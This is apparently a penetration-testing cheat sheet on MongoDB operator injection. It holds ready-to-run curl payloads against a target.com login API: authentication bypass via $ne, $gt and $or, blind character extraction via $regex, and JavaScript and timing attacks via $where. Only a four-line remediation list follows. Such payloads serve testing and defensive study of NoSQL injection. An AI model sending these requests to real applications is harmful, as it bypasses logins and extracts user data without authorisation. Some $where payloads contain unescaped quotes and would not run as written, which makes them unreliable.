# MongoDB Query Operator Injection

## Summary
MongoDB supports query operators like `$ne`, `$gt`, `$regex`, `$in`, and `$where`. When user input is passed directly into a query without sanitisation, an attacker can inject these operators.

## Authentication Bypass

### $ne (not equal) — Bypass login
```bash
# JSON body
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# URL-encoded form
curl -X POST https://target.com/login \
  -d 'username[$ne]=&password[$ne]='
```

### $gt (greater than) — Bypass with admin
```bash
# Match first username alphabetically
curl -X POST https://target.com/api/login \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Force admin user
curl -X POST https://target.com/api/login \
  -d '{"username": {"$gt": "a"}, "password": {"$gt": ""}}'
```

### $or / $and — Boolean logic
```bash
# Match any user, any password
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}'
```

## Data Extraction

### $regex — Blind character extraction
```bash
# Check if username starts with "a"
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": "^a"}, "password": {"$ne": ""}}'
# Login succeeds → username starts with "a"

# Bruteforce entire string
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$regex": ".*"},         "password": {"$ne": ""}}
```

### $where — JavaScript execution
```bash
# Time-based detection
curl -X POST https://target.com/api/login \
  -d '{"$where": "sleep(5000) || true"}'

# Boolean extraction
curl -X POST https://target.com/api/login \
  -d '{"$where": "this.username[0] == "a" || true"}'

# Data exfiltration via timing
curl -X POST https://target.com/api/login \
  -d '{"$where": "if(this.username[0]=="a"){sleep(5000)}"}'
```

### $in — Matching multiple values
```bash
curl -X POST https://target.com/api/search \
  -d '{"role": {"$in": ["admin", "superadmin", "root"]}}'
```

## Field Existence Checks

```bash
# $exists — check if field exists
curl -X POST https://target.com/api/login \
  -d '{"username": "admin", "password": {"$exists": true}}'

# $type — check BSON type
curl -X POST https://target.com/api/login \
  -d '{"username": "admin", "password": {"$type": "string"}}'
```

## Remediation
- Use a MongoDB ORM that enforces strict schemas (Mongoose, Doctrine ODM)
- Validate and reject input containing `$` prefixed keys
- Use parameterised queries with placeholder values
- Disable `$where` at the MongoDB server level
